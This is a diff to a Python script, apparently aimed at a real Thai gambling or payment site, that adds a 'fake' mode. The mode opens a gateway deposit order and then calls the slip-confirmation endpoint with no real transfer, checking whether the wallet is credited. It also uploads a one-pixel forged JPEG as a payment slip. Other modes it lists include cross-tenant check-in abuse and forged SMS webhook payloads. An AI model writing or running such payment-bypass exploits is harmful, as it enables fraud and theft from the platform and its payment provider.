@@ -4,6 +4,7 @@
    MODES:
    --mode tx    (default) POST /mb/deposit-transaction → AUTO-SLIP queue
    --mode gw             POST /mb/deposit-gateway → ONE2P-LOCAL (requires real transfer)
+   --mode fake           deposit-gateway order → immediate deposit-gateway-slip (no real transfer)
    --mode quest          GET/POST /mb/quest-daily-check-in (F89 cross-tenant)
    --mode sms            LuxSMS/Z Seamless webhook payload fire (F85/F92)
 
@@ -23,7 +24,7 @@ RTDB  = "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app"
 # ── Args ───────────────────────────────────────────────────────────────────────
 ap = argparse.ArgumentParser()
 ap.add_argument("amount", nargs="?", type=float, default=50.0)
-ap.add_argument("--mode", choices=["tx", "gw", "quest", "sms"], default="tx")
+ap.add_argument("--mode", choices=["tx", "gw", "fake", "quest", "sms"], default="tx")
 ap.add_argument("--jwt", type=pathlib.Path, default=None)
 ap.add_argument("--bank", choices=["kbank", "scb", "ttb", "truewallet"], default="kbank")
 ap.add_argument("--sms-text", default=None, dest="sms_text")
@@ -224,6 +225,77 @@ elif args.mode == "gw":
 
     if not confirmed:
         print("    [!] deposit-gateway-slip failed on all body variants")
+
+# ═════════════════════════════════════════════════════════════════════════════
+elif args.mode == "fake":
+    # ── Create gateway order then immediately fire deposit-gateway-slip ────────
+    # Tests whether the platform credits a deposit without the real bank transfer
+    # (gateway callback is what actually credits; this checks if slip-confirm alone
+    # is sufficient or if the gateway backend must confirm independently)
+    print(f"\n[1] POST /mb/deposit-gateway (ONE2P-LOCAL, {AMOUNT} THB) — no real transfer")
+    gw = s.post(f"{MGAPI}/mb/deposit-gateway",
+                headers=HDR,
+                json={"id":               GW_PAYMENT_BANK_INFO_ID,
+                      "deposit_amount":   AMOUNT,
+                      "lang":            "th",
+                      "deposit_account_id": GW_DEPOSIT_ACC_ID},
+                timeout=12)
+    print(f"    HTTP {gw.status_code}: {gw.text[:400]}")
+
+    if not gw.ok:
+        print("    [!] gateway locked or unavailable — try later")
+        sys.exit(1)
+
+    gw_data  = gw.json()
+    order_id = gw_data.get("order_id", "")
+    dest     = f"{gw_data.get('dest_bank_code','?')} {gw_data.get('dest_bank_no','?')}"
+    expired  = gw_data.get("expired", "?")
+    slip_url = gw_data.get("dest_upload_slip_url", "")
+    print(f"    order={order_id}  dest={dest}  expires={expired}")
+    print(f"    slip_url={slip_url}")
+
+    # Immediately fire deposit-gateway-slip without actual payment
+    print(f"\n[2] POST /mb/deposit-gateway-slip (immediate — no real transfer)")
+    for label, body in [
+        ("order_id",   {"order_id": order_id}),
+        ("empty",      {}),
+        ("full",       {"payment_bank_information_id": GW_PAYMENT_BANK_INFO_ID,
+                        "order_id": order_id, "deposit_amount": AMOUNT}),
+    ]:
+        r = s.post(f"{MGAPI}/mb/deposit-gateway-slip",
+                   headers=HDR, json=body, timeout=12)
+        print(f"    [{label}] HTTP {r.status_code}: {r.text[:200]}")
+        if r.ok:
+            print(f"    [!!!] 200 — checking wallet in 3s...")
+            time.sleep(3)
+            print(f"    wallet: {wallet()}")
+            break
+
+    # Also try the ONE2P slip service upload endpoint directly
+    if slip_url:
+        print(f"\n[3] ONE2P slip service — probe upload without real slip")
+        # Extract token from URL
+        try:
+            from urllib.parse import urlparse, parse_qs
+            pq = parse_qs(urlparse(slip_url).query)
+            tok = pq.get("t", [""])[0]
+            upload_url = slip_url.replace("/upload-info/", "/upload-slip/").split("?")[0]
+            upload_url = f"{upload_url}?t={tok}"
+            # try multipart with 1-pixel fake JPEG
+            fake_jpg = (b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
+                        b"\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t"
+                        b"\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a"
+                        b"\x1f\x1e\x1d\x1a\x1c\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\x1e"
+                        b"\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00"
+                        b"\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00"
+                        b"\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b"
+                        b"\xff\xda\x00\x08\x01\x01\x00\x00?\x00\xfb\xd2\x8a(\x00\xff\xd9")
+            r2 = requests.post(upload_url,
+                               files={"slip": ("slip.jpg", fake_jpg, "image/jpeg")},
+                               timeout=12)
+            print(f"    ONE2P upload HTTP {r2.status_code}: {r2.text[:200]}")
+        except Exception as e:
+            print(f"    ONE2P upload EXC: {e}")
 
 # ═════════════════════════════════════════════════════════════════════════════
 elif args.mode == "quest":
